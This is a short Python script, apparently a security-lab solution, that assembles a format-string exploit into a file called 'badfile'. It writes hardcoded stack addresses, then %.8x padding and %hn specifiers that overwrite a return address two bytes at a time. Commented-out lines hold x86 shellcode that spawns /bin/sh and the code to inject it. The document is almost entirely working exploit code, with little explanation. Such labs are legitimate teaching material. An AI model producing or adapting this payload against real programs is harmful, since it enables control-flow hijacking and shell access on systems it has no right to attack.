# shellcode = bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")

# Initialize the content array
CONTENT_LENGTH = 1000
content = bytearray(0 for i in range(CONTENT_LENGTH))
# content[-len(shellcode) :] = shellcode
# offset_shellcode = CONTENT_LENGTH - len(shellcode)

current_index = 0

"""Prefix format specifiers (optional)

N = 1
fmt1 = ("%.8x" * N).encode()  # %x means unsigned int as a hexadecimal number
content[current_index : current_index + len(fmt1)] = fmt1
current_index += len(fmt1)
print("format specifiers 1 is ", fmt1)
"""

# frame pointer of fmtstr is 0xffffd298
target_address = 0xFFFFD298 + 4  # return address
content[current_index : current_index + 4] = (target_address + 2).to_bytes(
    4, byteorder="little"
)
current_index += 4

# critical to add four random bytes
content[current_index : current_index + 4] = b"!@#$"
current_index += 4

content[current_index : current_index + 4] = (target_address).to_bytes(
    4, byteorder="little"
)
current_index += 4

N = 4
# specify offset of shellcode
small_value = 0xCE8C
large_value = 0xFFFF

# specify first 2 bytes (small)
num_of_padding_zeros = small_value - 8 * (N - 1) - 4 * 3
fmt2 = ("%.8x" * (N - 1) + f"%.{num_of_padding_zeros}x" + "%hn").encode()
content[current_index : current_index + len(fmt2)] = fmt2
current_index += len(fmt2)
print("format specifiers 2 is ", fmt2)

# specify second 2 bytes (large)
fmt3 = (f"%.{large_value - small_value}x" + "%hn").encode()
content[current_index : current_index + len(fmt3)] = fmt3
current_index += len(fmt3)
print("format specifiers 3 is ", fmt3)

# inject shellcode
# content[current_index : current_index + len(shellcode)] = shellcode
# print("offset of shellcode is ", current_index)

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()
